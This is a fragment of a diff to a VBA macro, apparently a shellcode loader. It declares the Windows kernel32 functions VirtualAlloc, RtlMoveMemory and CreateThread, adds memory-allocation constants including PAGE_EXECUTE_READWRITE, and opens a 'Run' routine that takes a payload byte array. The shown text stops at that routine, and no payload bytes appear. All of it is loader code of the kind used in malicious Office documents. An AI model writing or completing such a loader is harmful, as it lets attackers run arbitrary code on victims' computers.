@@ -1,5 +1,10 @@
+Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByVal Source As LongPtr, ByVal Length As LongPtr)
 Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As Long
 Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+
+Const MEM_RESERVE = &H2000
+Const MEM_COMMIT = &H1000
+Const PAGE_EXECUTE_READWRITE = &H40
 
 Private Sub Run(ByRef bPayloadArr() As Byte)
     Dim lPayloadAddr As LongPtr, lPayloadSize As Long
